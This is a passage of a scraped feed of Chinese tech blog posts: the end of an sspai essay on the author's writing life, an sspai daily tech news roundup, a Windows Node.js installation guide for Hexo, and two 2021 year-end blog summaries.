的天梯图），可以说是「数据党」的福音了。</p>\n<p><strong>拓展阅读</strong></p>\n<ul>\n<li><a href=\"https://www.notebookcheck.net/Microsoft-Surface-Laptop-Go-Review-An-Overpriced-Netbook.498859.0.html\" target=\"_blank\">Microsoft Surface Laptop Go Review: An Overpriced Netbook</a></li>\n<li><a href=\"https://www.notebookcheck.net/Mobile-Processors-Benchmark-List.2436.0.html\" target=\"_blank\">Mobile Processors - Benchmark List</a></li>\n</ul>\n<h4><a href=\"http://anandtech.com/\" target=\"_blank\">AnandTech</a></h4>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c7t9n2lb34taavnbb3eg.png\"></figure><p>AnandTech 以其硬核的硬件评测而出众，可以说硬核得甚至有点「朴素」。AnandTech 的评测通常分为许多页面，不同的页面上有着测评的不同部分，我们可以点击快速跳转到自己关心的部分。此外，AnandTech 的测评通常十分「深度」，当时针对 M1 SoC 的介绍与测评文章，应该是我看到过的最为详细，解释也最复杂的，可以说是大开眼界了。如果想要了解最新、最硬核的有关电子消费品的测评信息，AnandTech 是不能错过的。</p>\n<p><strong>拓展阅读</strong></p>\n<ul>\n<li><a href=\"https://www.anandtech.com/show/17024/apple-m1-max-performance-review\" target=\"_blank\">Apple's M1 Pro, M1 Max SoCs Investigated: New Performance and Efficiency Heights</a></li>\n<li><a href=\"https://www.anandtech.com/show/16252/mac-mini-apple-m1-tested\" target=\"_blank\">The 2020 Mac Mini Unleashed: Putting Apple Silicon M1 To The Test</a></li>\n</ul>\n<h2>总结我过去的写作</h2>\n<p>如果打开我的 <a href=\"https://kostya.club/\" target=\"_blank\">博客</a> 和 <a href=\"https://www.sspai.com/u/kostya/updates\" target=\"_blank\">少数派主页</a>，会发现自己拿来下笔的生活素材无非是这几种：</p>\n<ul>\n<li>买了新的硬件、下载了新的软件，分享自己的使用体验；</li>\n<li>吃了好吃的东西，玩了一些好玩的地方，记录下自己当时的心情；</li>\n<li>对某些事情有一些自己的了解，写出指导性的文章和信息供大家参考评阅。</li>\n</ul>\n<p>其实每种类型的文章有其不同的写作目标与写作方式，或许我能从中总结出一些可用的经验来，作为日后写作努力的方向和遵守的原则。</p>\n<h3>硬件测评与软件体验</h3>\n<ul>\n<li>主观体验 + 客观实际</li>\n<li>个人需求 + 大众需求</li>\n</ul>\n<p>每次接到硬件、软件测评体验类的文章邀约，或者是自己买了什么新的硬件或者下载了什么新的软件，我考虑的<strong>第一个问题总是</strong>：它满足了什么样的需求？我为什么会购买（下载）这款产品？因此，我常常在文章的开头会写上我个人的需求与期待。</p>\n<p>这是因为，在做出购买决策的时候，实际上需求是在第一位考虑的。除了客观上的功能参数，是否能够满足需求、满足什么样的需求，也是十分重要的。这里的需求可能有很多种：从实用的对于硬件、软件性能、功能的需求，到个人主观上的对于审美乃至虚荣一类的心理需求，其实都是我们在买一样东西之前所需要考虑的。这些需求，我也都会一并写到自己的测评体验类文章中，并且试图说明所测评的硬件或者软件，如何满足需求，以及满足需求的程度如何。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c7t9n2tb34taatkrl01g.png\"><figcaption>Surface Laptop</figcaption></figure><p>例如，<a href=\"https://sspai.com/post/70988\" target=\"_blank\">Surface Laptop Go</a> 尽管难以满足我在硬件性能上的最高需求，但是在其他许多方面都可以满足我的心理需求（例如：重量、外观、手感等等），这些都是我在测评时需要着重介绍的要点。除此之外，我也会利用详细的性能参数等更为客观的标准，对产品进行评价。毕竟，尽管我自己的需求得到了满足，我的读者仍然需要更为客观的标准去判断一款产品是否能够符合他们的需求。</p>\n<p>我认为，只从主观出发进行评价，或者只从客观进行评价，在硬件、软件的测评体验中，是绝对不可取的。主观体验和客观实际在这类文章中需要做到互相支持。其实，最近越来越多的人<a href=\"https://sspai.com/post/70994\" target=\"_blank\">强调</a>「去工具论」，认为效率和使用何种工具的关系不大；人们如何去使用工具、工具如何能够满足人的需求，才是决定效率最重要的因素。这也是我在测评体验类的文章中所想要强调的：<strong>无论其他人多么吹捧一款工具 / 一款硬件，只有适合你的，才是最好的。</strong></p>\n<h3>生活兴趣</h3>\n<ul><li>主观体验最为重要</li></ul>\n<p>如果是生活兴趣类的文章，那么实实在在地把主观体验记录下来，是最重要的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c7t9n35b34taavnbb3f0.jpeg\"></figure><p>至于我个人的体验是否能吸引其他人，并不重要 —— 写作的目的不是软文，而是要突出个人体验。正因为如此，体验中无论是好的还是坏的，我都会毫无保留地写出来。这一点，在今年突发奇想写出的《<a href=\"https://sspai.com/post/68920\" target=\"_blank\">人在北京，想吃汉堡</a>》中有所体现。在两个星期的时间里，我造访了北京城差不多 10 家汉堡店，在每一家汉堡店点了我觉得会好吃的汉堡 —— 尽管最后仍然是不免踩坑，但正是这种主观体验的经历，才是此类文章中最重要，也是最有价值的东西。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c7t9n3db34taavnbb3fg.png\"></figure><p>相比之下，《<a href=\"https://sspai.com/post/68415\" target=\"_blank\">城市漫游指南｜魂断莫斯科</a>》要更为「严肃」。尽管我每年都会有针对莫斯科的「回忆杀」时刻，但是将其写成近万字的综合性长文，是我从未想过的。不过也好，以后翻出来这篇文章的时候，我便能回想起之前在莫斯科生活的点点滴滴，记忆也因此不会被磨灭 —— 更加重要的是，由于有不少读者读过这篇文章，<strong>我的记忆也成为了这些读者的记忆</strong>。</p>\n<p>写生活兴趣一类的文章，我认为最重要的可能莫过于<strong>真实</strong>。真实的记忆、真实的体验是这类文章能够最终写得下去并且成型的关键所在，更是打动读者、与其产生共鸣的基础。若不是亲身走过莫斯科的大街小巷，见识过那里的风土人情，又怎么可能写得出洋洋洒洒的一篇文章呢？</p>\n<p>生活本身，<strong>可能有 90% 是普通和无聊的</strong> —— 但是，如何在这种无边无际的普通与无聊之中找到自己想要的、热爱的并且持之以恒，这是我记录自己生活点滴的初衷，也是我尝试新鲜事物的动力。</p>\n<h3>教程 / 小技巧</h3>\n<ul>\n<li>客观实际最为重要</li>\n<li>需要面面俱到</li>\n<li>如何兼顾有趣与足够的信息量 —— 可以尝试问题导向</li>\n</ul>\n<p>最后一类文章可能看起来比较枯燥无味，因为它们平铺直叙，充满术语和微小的细节，很难用一种有趣的方式展开。去年 10 月左右参与了少数派《iOS 15 系统指南》这一付费系列的写作，写作的目标是「有趣」「易懂」，但是我个人觉得，在自己负责的 iPadOS 部分，<strong>目标似乎远未达成</strong>。尽管在我看来，此类文章，客观实际最为重要，同时要兼顾各种情况 —— 但是如何在顾及上面两点的同时做到有趣易懂，这可能真的值得研究一番，也是我在接下来写作中可能要努力的方向之一。</p>\n<p>在这个方面，我比较欣赏 <a href=\"https://sspai.com/u/a5xddvxl/updates\" target=\"_blank\">玉树芝兰</a> 老师的作品。他也经常会写一些教程类的文章作品，但是是以一种启发式的口吻写作，而非平铺直叙 —— 一般来说，他的文章使用第二人称，通常会先抛出一两个问题作为开头的引子，之后以一种循序渐进的方式解答这个问题，整个过程中通常不断使用设问句型推进文章的主线。</p>\n<p>例如文章《<a href=\"https://sspai.com/post/71093\" target=\"_blank\">卡片笔记太多，回忆不起来？快用人工智能帮你自动找寻关联</a>》中，从「卡片太多」谈起，作者自然而然引入了「效率和记忆容量」的问题。此后，他再提出不同的人解决这个问题的方案，最后提出自己的解决方式 —— 利用人工智能自动计算文本近似度，从而寻找卡片之间的关联。实际上，整篇文章针对 <strong>操作</strong> 本身的叙述并不算多，<strong>思考</strong> 和 <strong>解决问题的方式</strong> 才是重点。不过，文章很好的平衡了不同读者的需求 —— 有些读者可能需要的是步骤，有些读者需要的是背后解决问题的方式 —— 各取所需即可。可以说，这是我理想中的教程，但是我目前水平有限，真的很难写出来。</p>\n<h2>写作如何融入我的生活？</h2>\n<h3>喧闹，市井，咖啡香</h3>\n<p>如今回想起来，我的一大半稿子可能是在咖啡馆里面写出来的。也正因为如此，我算是摸清了几乎每家连锁咖啡店的套路：<strong>哪里有插座、哪里比较安静、哪家门店人通常比较少、什么时段的人最少</strong>……尽管听起来十分 cliche，但是咖啡馆的确有这种神奇的魔力，能够让我在相对嘈杂的环境中集中注意力在自己的文字产出上不分心。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c7t9n3tb34taavnbb3g0.jpeg\"></figure><p>可能这也是为什么我到了一个新的地方之后，最喜欢的莫过于先去探索一下当地的咖啡馆。不仅仅是为了咖啡，也是为了一种奇妙的氛围，让我能够以一种最为放松的状态去记录自己当下的生活与体验。咖啡馆的嘈杂本身倒不是什么特别能够打扰到我的东西 —— 我其实挺害怕完完全全的安静的，周遭有一些人声反而能够让我更加专注于眼前所写的东西。</p>\n<p>如果要问我常点什么咖啡，不如看看 <a href=\"https://sspai.com/post/67915\" target=\"_blank\">这篇文章</a>。不过，最近的我倒是迷上了冷萃咖啡。冷萃咖啡本身的魅力，可能就在于它浓郁的香气，以及与普通的意式咖啡并不相同的醇厚口感。冷萃，加上冰块（不额外加水），就成了我在咖啡馆最常点的饮料，提神醒脑的同时，也能体会咖啡本身的苦味在口中渐渐转化为香气和回甘。</p>\n<h3>趁手的写作工具</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c7t9n4db34ta988752fg.jpeg\"></figure><p><strong>在咖啡馆写作</strong>，我的写作工具必然是一台移动设备。之前我会经常用 iPad Pro，最近也经常用 Surface Laptop Go。移动写作意味着我所携带的设备并非需要在性能上有多么优越，更需要的是优秀的便携性、续航，以及舒适的输入体验。iPad Pro 和 Surface Laptop Go 在一般情况下都还算可以满足以上两点要求，同时成本也在我可以接受的范围内。值得一提的是，iPad Pro（搭配妙控键盘）和 Surface Laptop Go 都有很舒服的键盘，以及易用的触控板 —— 大部分时候我无需使用其他输入方式（例如触摸）就可以完成所有的操作。</p>\n<p><strong>在家写作</strong>，我的写作工具则是一把 HHKB 键盘搭配 Mac mini（M1，2020）。我一直以来都很喜欢 HHKB 键盘回弹的手感，以及它紧凑的布局。我的 HHKB 是 Professional 2 Type S，因此在音量上并不算大，不会有其他机械键盘那种非常夸张的敲键音。Mac mini 的可靠性自然不用说，可以没有任何压力轻松应付从码字到修图再到简单的视频剪辑这一系列的工作流程，只恨不能随身携带。</p>\n<h3>和朋友、编辑、任何人讨论</h3>\n<p><strong>写作，其实从来都不是一个人的事</strong>。尽管我很喜欢一个人在不受干扰的环境中完成写作，但是其实写作中所需要的观点和灵感不可能完全来自自己。已经数不清有多少次，我是在和朋友的聊天中、在和编辑们的插科打诨中、甚至是在评论区和读者讨论的过程中，迸发出了新点子，写成了新的文章。和他们的聊天、讨论通常总是可以打开我的视野，为写作提供新鲜的角度。</p>\n<p>例如，写《<a href=\"https://sspai.com/post/68224\" target=\"_blank\">开学季｜证多不压身，聊聊大学里值得「拼一拼」的证书考试</a>》的时候，和朋友坐下来花了几个小时细数了几种不同资格考试的形式、内容以及难度，甚至还翻朋友圈八卦了周围的同学、朋友通过这些考试的情况。另外，题目本身是编辑 Tp 提出的，我写之前其实并没有太大的信心，还是他给了我不少鼓励。</p>\n<p>此外，也十分感谢这一年来和我有许多交集的各位少数派编辑们。我有时候的确会有点「鸽」，要不是各位编辑及时的催稿，我可能也不会在上个月正式突破百万的文章总阅读量。和其中的几位编辑，除了写作「公事公办」之外，我们私下里也会时常交流 —— 分享听了什么歌、看了什么电影，有什么好吃的好玩的，甚至也会约出来吃饭 —— 可能这才是 Matrix 能被称作是「<strong>社区</strong>」的真谛吧？我能够坚持写作，自身兴趣之外，这种独特的归属感也是强大的动力。</p>\n<h2>没有写作的生活，早已无法想象</h2>\n<p>我还记得，五年前，自己第一次参加少数派年度总结征文的时候，标题是「成为数字生活的分享者」。尽管标题这么写了，当时的自己其实还尚未意识到，在少数派我能够收获多少；还尚未理解，为何写作可以成为一种生活方式。而现在，每逢周末，我就会背上自己的电脑，到或近或远的咖啡馆坐下，喝一杯咖啡，开始写下或多或少的文字。可能不是每个字都会让大家看见 —— 但是写作已经成为了一种习惯，成为了我定义自己的方式。</p>\n<p>似乎没有写作的生活，我早已无法想象。</p>\n<p><i>本文参与少数派 2021 年度征文「生活 21」赛道。</i></p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\" target=\"_blank\">客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，找到数字时代更好的生活方式 🎊</p>\n<p>&gt; 年度回顾、好物推荐…… 更多精彩尽在 <a href=\"http://sspai.com/page/2021\" target=\"_blank\">少数派 2021 年度盘点</a> 🎉</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/71272"},{"title":"派早报：Surface Laptop Studio 国行开始预售、微信车载版已支持 15 家汽车厂商等","date":"2022-02-15 00:56:31","description":"\n<h2>你可能错过的新鲜事</h2>\n<h3>Surface Laptop Studio 国行开始预售</h3>\n<p>2 月 14 日，微软官方商城宣布 Surface Laptop Studio 即日起开启预售。该设备配备了 14.4 英寸 120Hz PixelSense 触摸屏，搭载了英特尔第 11 代 H 系列四核处理器，最高搭载 NVIDIA RTX 3050Ti GPU 显卡、32GB 内存和 2TB 存储。续航方面，设备常规使用下可以维持 19 小时，并搭配 Thunderbolt 4 技术的 USB 4.0 端口。衔接部位采用了动态编织铰链，方便用户快速进行三种模式的切换。产品售价 12188 元起。<a href=\"https://www.microsoftstore.com.cn/surface/surface-laptop-studio?Icid=ZHCN_SurfaceCategory_product01_surfacelaptopstudio_202202\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c85fbbdb34ta98875ti0.jpeg\"></figure><h3>微信车载版已支持 15 家汽车厂商</h3>\n<p>近日，微信官网更新「微信车载版」相关页面。据官网信息，微信车载版将主要通过语音方式进行交互，不需要点触操作应用。在开车场景中，用户可以始终专注驾驶本身。除此之外，也可以通过方向盘按键操作，驾驶者可以快速唤醒微信车载版，便捷播报、回复消息，接听、挂断语音通话，保证双手不离开方向盘的情况下安全地与好友沟通。微信车载版暂只支持汽车出厂时已完成适配微信车载版的相关车辆，不支持单独下载安装。目前已有 15 家汽车厂商接入，包括奥迪、宝马、北京、长安、长城、理想、丰田等。<a href=\"https://car.weixin.qq.com/#/detail\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c85fbblb34ta98875tig.jpeg\"></figure><h3>微软将停止对旧版本 Visual Studio 的支持</h3>\n<p>近日，微软官方在博客中发布公告，最迟将于 2023 年 1 月前取消对 Visual Studio 2012、Visual Studio 2017、Visual Studio 2019 预览频道的支持，并强烈建议用户更新至去年最新发布的 Visual Studio 2022 。<a href=\"https://devblogs.microsoft.com/visualstudio/support-ends-for-older-versions-of-visual-studio-feb2022/\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c85fbbtb34taavnbbt10.jpeg\"></figure><h3><strong>AMD 宣布完成对赛灵思的收购</strong></h3>\n<p>AMD 于 2 月 14 日宣布完成对赛灵思的收购，正式成为集 CPU、GPU、FPGA 于一身的芯片巨头。前赛灵思董事会成员 Jon Olson 和 Elizabeth Vanderslice 已加入 AMD 董事会。赛灵思股东将以每股赛灵思普通股换取 1.7234 股 AMD 普通股，赛灵思普通股将不再在纳斯达克股票市场上市交易。此前 AMD 于 2020 年 10 月 27 日宣布以全股票交易方式收购赛灵思，当时据路透社报道称收购价格为 498 亿美元。<a href=\"https://www.ithome.com/0/602/971.htm\" target=\"_blank\">来源</a></p>\n<h3><strong>索尼推出 SRS-RA5000 旗舰级高解析度蓝牙音箱</strong></h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c85fbc5b34taavnbbt1g.png\"></figure><p>索尼于 2 月 14 日正式发布旗舰级高解析度蓝牙音箱 SRS-RA5000 和高音质蓝牙音箱 SRS-RA3000，其中 SRS-RA5000 采用 7 个扬声器组合，搭载了进阶版的 S-Master HX 数字放大器技术以及 DSEE HX 数字声音增强引擎；SRS-RA3000 则采用 80mm 的发声单元，支持索尼 S-Master 数字放大器技术以及 DSEE 数字声音增强引擎。两款音箱均支持 3.5mm 有线连接、蓝牙连接以及 Qplay，SRS-RA5000 还支持 NFC 快速连接。目前两款音箱已上架索尼官网，RA5000 售价 4499 元，RA3000 售价 2499 元，开售时间暂未确定。<a href=\"https://www.ithome.com/0/602/913.htm\" target=\"_blank\">来源</a></p>\n<h3><strong>《新蝙蝠侠》确认引进中国内地</strong></h3>\n<p>DC 电影官方微博于 2 月 14 日正式宣布，旗下的电影新作《新蝙蝠侠》将正式引进至内地，目前尚未公布正式档期。《新蝙蝠侠》是由马特·里夫斯执导的超级英雄电影，由罗伯特·帕丁森、杰弗里·怀特、佐伊·克拉维兹、保罗·达诺等联袂主演，讲述了蝙蝠侠深入哥谭市地下世界，调查名流被谋杀案真相的故事。消息称《新蝙蝠侠》全长 175 分钟。<a href=\"https://www.ithome.com/0/602/931.htm\" target=\"_blank\">来源</a></p>\n<h2>看看就行的小道消息</h2>\n<ul>\n<li>借助 Android 13 DP1 中出现的 KVM 虚拟机，XDA 开发者 kdrag0n 在 Pixel 6 上成功运行了完整版 Windows 11。<a href=\"https://twitter.com/kdrag0n/status/1492754683445669893\" target=\"_blank\">来源</a>\n</li>\n<li>据外媒 MacRumors 报道，Apple 目前已向欧亚经济委员会数据库中提交了三款新的 Mac 电脑型号，分别为 A2615、A2686 和 A2681，这三款设备或将在 3 月 8 日的春季发布会上发布。<a href=\"https://www.macrumors.com/2022/02/14/apple-files-new-macs-ahead-spring-event/\" target=\"_blank\">来源</a>\n</li>\n</ul>\n<h2>少数派的近期动态</h2>\n<ul>\n<li>🎁 少数派 iOS 客户端<a href=\"https://itunes.apple.com/cn/app/id1191720421?mt=8\" target=\"_blank\">重大更新</a>，<a href=\"https://apps.apple.com/cn/app/id1191720421?eventid=6442693454\" target=\"_blank\">「派读」功能新鲜上线</a>，为你打造量身定制的内容拼盘。</li>\n<li>📕 <a href=\"https://sspai.com/prime/precog/techod-0x09\" target=\"_blank\">科技漫游第 0x09 期</a> 正在更新，学学如何<a href=\"https://sspai.com/prime/story/shortcuts-blood-pressure-monitering\" target=\"_blank\">用快捷指令帮家人记录血压</a>，更有 <a href=\"https://sspai.com/prime/story/charles-sina-lottery-tutorial\" target=\"_blank\">Charles 抓包实战</a>。</li>\n<li>🎇 会员通讯 <a href=\"https://sspai.com/prime/precog/vol015-pre-moving-forward\" target=\"_blank\">第 15 期</a> 上线，带你了解 <a href=\"https://sspai.com/prime/story/vol015-talk-about-background-check\" target=\"_blank\">工作背景调查</a>、建立 <a href=\"https://sspai.com/prime/story/vol015-how-to-take-smart-notes\" target=\"_blank\">写作工作流</a>、线下 <a href=\"https://sspai.com/prime/story/vol015-ebook-or-physical-book\" target=\"_blank\">读书找书</a> 等。</li>\n<li>☕ 少数派报告《<a href=\"https://sspai.com/prime/precog/specialty-coffee-report\" target=\"_blank\">精品咖啡入门指南</a>》已上线，从相对硬核的咖啡豆种、处理法、烘焙法到大家关心的器材和冲煮攻略，都在这里啦！</li>\n</ul>\n<h2>你可能错过的文章</h2>\n<ul>\n<li>📃 <a href=\"https://sspai.com/post/71294\" target=\"_blank\">用一张价值 3000 元的纸是什么感受？这是我的 reMarkable 2 体验</a>\n</li>\n<li>🚗 <a href=\"https://sspai.com/post/71421\" target=\"_blank\">不买可以先收藏 10：选对行车记录仪，和路上的「麻烦」坦然交手</a>\n</li>\n<li>👀 <a href=\"https://sspai.com/post/71409\" target=\"_blank\">少数派 App 大更新，我们为你准备了一份专属内容拼盘：派读</a>\n</li>\n<li>⭐ <a href=\"https://sspai.com/post/71434\" target=\"_blank\">派评 | 近期值得关注的 App</a>\n</li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/71451"},{"title":"在 Windows 上快速安装 Hexo · 安装 Node.js","date":"2022-01-14 10:30:00","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%89%8D%E8%A8%80\" class=\"headerlink\" title=\"前言\"></a>前言</h2>\n<p><strong>本文未经允许，禁止转载！</strong></p>\n<p><strong>视频教程正在制作，等待更新。</strong></p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%87%E7%AB%A0%E7%9B%AE%E5%BD%95\" class=\"headerlink\" title=\"文章目录\"></a>文章目录</h2>\n<ul>\n<li><a href=\"https://blog.yfun.top/posts/hexo-blog/install-git\">安装 Git</a></li>\n<li><a href=\"https://blog.yfun.top/posts/hexo-blog/install-nodejs\">安装 Node.js</a></li>\n</ul>\n<blockquote><p>更多文章等待更新...</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%B8%8B%E8%BD%BD\" class=\"headerlink\" title=\"下载\"></a>下载</h2>\n<p>前往 Node.js 官网 (<a href=\"https://node.js.org/\">https://node.js.org</a>)</p>\n<p><img src=\"https://unpkg.zhimg.com/ocoke-osg@0.0.14/rawimg/image-20220114174925675.png\" alt=\"image-20220114174925675\"></p>\n<p>下载 Node.js 安装包（推荐下载 LTS 版本）</p>\n<p><img src=\"https://unpkg.zhimg.com/ocoke-osg@0.0.14/rawimg/20220114175645.png\" alt=\"image-20220114175645642\"></p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%AE%89%E8%A3%85\" class=\"headerlink\" title=\"安装\"></a>安装</h2>\n<p>双击运行安装文件。</p>\n<p>点击 <code>Next</code>。</p>\n<p><img src=\"https://unpkg.zhimg.com/ocoke-osg@0.0.14/rawimg/20220114175750.png\" alt=\"image-20220114175749822\"></p>\n<p>勾选同意协议，点击 <code>Next</code>。</p>\n<p><img src=\"https://unpkg.zhimg.com/ocoke-osg@0.0.14/rawimg/20220114175835.png\" alt=\"image-20220114175835742\"></p>\n<p>修改文件安装位置，点击 <code>Next</code>。（也可以不用改）</p>\n<p><img src=\"https://unpkg.zhimg.com/ocoke-osg@0.0.14/rawimg/20220114175929.png\" alt=\"image-20220114175929226\"></p>\n<p>点击 <code>Next</code>。</p>\n<p><img src=\"https://unpkg.zhimg.com/ocoke-osg@0.0.14/rawimg/20220114180010.png\" alt=\"image-20220114180010036\"></p>\n<p><img src=\"https://unpkg.zhimg.com/ocoke-osg@0.0.14/rawimg/20220114180044.png\" alt=\"image-20220114180043895\"></p>\n<p>点击 <code>Install</code> 开始安装。</p>\n<p><img src=\"https://unpkg.zhimg.com/ocoke-osg@0.0.14/rawimg/20220114180108.png\" alt=\"image-20220114180107827\"></p>\n<p>等待安装完成。<img src=\"https://unpkg.zhimg.com/ocoke-osg@0.0.14/rawimg/20220114180122.png\" alt=\"image-20220114180122728\"></p>\n<p>点击 <code>Finish</code> 完成安装。</p>\n<p><img src=\"https://unpkg.zhimg.com/ocoke-osg@0.0.14/rawimg/20220114180206.png\" alt=\"image-20220114180206024\"></p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%B5%8B%E8%AF%95\" class=\"headerlink\" title=\"测试\"></a>测试</h2>\n<p>打开 <code>Git Bash</code>.</p>\n<blockquote><p>在文件夹处右击，点击 <code>Git Bash Here</code> 进入 Git Bash。<br>或是在开始菜单中找到 Git Bash.</p></blockquote>\n<p>输入 <code>node -v</code> 和 <code>npm -v</code> 查看版本，正确输出版本信息即代表安装成功。</p>\n<p><img src=\"https://unpkg.zhimg.com/ocoke-osg@0.0.14/rawimg/20220114180458.png\" alt=\"image-20220114180458685\"></p>\n","link":"https://blog.yfun.top/posts/hexo-blog/install-nodejs/"},{"title":"2022: 新年快乐！","date":"2021-12-31 16:00:00","description":"\n<p>转眼间，2021 年已经过去。这一年非常忙碌，以至于博客一周年的纪念来不及写，许多文章计划停留在了 To Do 里。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%8D%9A%E5%AE%A2\" class=\"headerlink\" title=\"博客\"></a>博客</h2>\n<p>由于 Cloudflare Web Analytics 是在 2021 年 4 月份启用的，再加上后来又将统计代码去除，所以关于访问量的信息不可用。</p>\n<p>截止至 2021 年 12 月 31 日，博客共发布 15 篇文章，其中 2021 年发布 11 篇文章，原创文章 10 篇。</p>\n<p>目前采用 <code>LeanCloud + Waline</code> 的评论方式，自 7 月份被刷评论后将评论权限改为登录（支持 <code>GitHub</code> 登录），还有部分评论在迁移中丢失，实在抱歉。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%B8%BB%E9%A2%98\" class=\"headerlink\" title=\"主题\"></a>主题</h2>\n<p>博客自 2021 年 1 月 13 日将主题改为 <code>Miracle</code>，这是一款简洁、轻量的单栏 Hexo 主题。</p>\n<p><code>Miralce</code> 目前的版本是 <code>2.0.1</code>，全新的版本去除 jQuery，进一步提升性能。</p>\n<p>GitHub 仓库：<a href=\"https://github.com/hifun-team/hexo-theme-miracle\">https://github.com/hifun-team/hexo-theme-miracle</a></p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%9B%B4%E5%A4%9A\" class=\"headerlink\" title=\"更多\"></a>更多</h2>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">=&gt; ...</span><br></pre></td></tr></table></figure>\n","link":"https://blog.yfun.top/posts/2022/"},{"title":"无垠 2021 年度总结","date":"2021-12-31 08:36:10","description":"\n<p>真是忙碌的一年啊。转眼 2021 已经过去，2022 即将到来。又到了该总结这一年的时候了。</p>\n<h1>统计数据</h1>\n<p>年度总结的第一部分仍然是一些统计数据。以下数据截止 2021 年 12 月 29 日 23:39:59。</p>\n<h2>博客主站</h2>\n<p>无垠博客主站，年 UV 29,073 (<span>+0.6%</span>)，年 PV 67,688 (<span>-11.61%</span>)，日均 UV 79.65，平均停留时间 3分34秒 (<span>-13.7%</span>)，平均跳出率 55% (<span>-9.8%</span>)。一年有效文章数 1 (<span>-80%</span>)，新增评论 109 条 (<span>-54.96%</span>)。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/blog.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/blog.jpg\" alt=\"\" width=\"515\" height=\"620\" class=\"aligncenter size-full wp-image-2537\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/blog.jpg 515w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/blog-249x300.jpg 249w\" sizes=\"(max-width: 515px) 100vw, 515px\"></a>\n<p>除了 UV 较去年提高 100 多之外，其他数据全部下滑。主要原因还是因为今年实在太过忙碌，只更新了一篇博客，评论区也没有怎么维护。不过目前已经有两篇新的文章在路上了，希望可以尽快写完吧。</p>\n<h2>个人主页</h2>\n<p>个人页总 UV 3,515 (<span>-18.12%</span>)，总 PV 3,929 (<span>-4.56%</span>)，日均 UV 9.63，平均停留时间 55秒 (<span>-12.7%</span>)。访问的主要来源是知乎和 GitHub。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/axton.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/axton.jpg\" alt=\"\" width=\"515\" height=\"647\" class=\"aligncenter size-full wp-image-2538\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/axton.jpg 515w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/axton-239x300.jpg 239w\" sizes=\"(max-width: 515px) 100vw, 515px\"></a>\n<p>仍然是没有更新个人主页的一年，我也没有继续宣传这个页面，统计数据下滑大概是正常的。</p>\n<h2>MDx</h2>\n<p>一年中，MDx 更新了 4 次，新增 149 commits (<span>-54.57%</span>)，Star 数增加了 174，现有 788。</p>\n<p>终于，MDx 2.0 发布了。但是因为今年的过于忙碌，MDx 并没有得到足够的维护，版本发布周期也拉得比较长，很多 Bug 没能及时修复。希望明年可以把更多的时间花在维护 MDx 上。无论如何，还是感谢各位对于 MDx 的支持！</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"mdx\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/mdx\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<h1>2021 大事记</h1>\n<p>说起来，2021 真的太多“第一次”了...</p>\n<ul>\n<li>一月：由于电脑电池鼓包，第一次用 iPad 外接屏幕远程桌面到服务器来考期末🌚太痛苦了</li>\n<li>一月：MDx 喜提 600 Stars</li>\n<li>三月：第一次测核酸（真的酸）</li>\n<li>三月：第一次坐上 A350！(B-309W）</li>\n<li>三月：第一次来到英国</li>\n<li>六月：第一次来到伦敦</li>\n<li>六月：第一次去猫咖撸猫🐱</li>\n<li>六月：第一次坐上 B777！(B-2025）</li>\n<li>七月：酒店隔离十四天🌚</li>\n<li>七月：MDx 喜提 700 Stars</li>\n<li>七月：第一次和猫一起住（时刻有猫撸真的爽😆）</li>\n<li>七月：入职<a 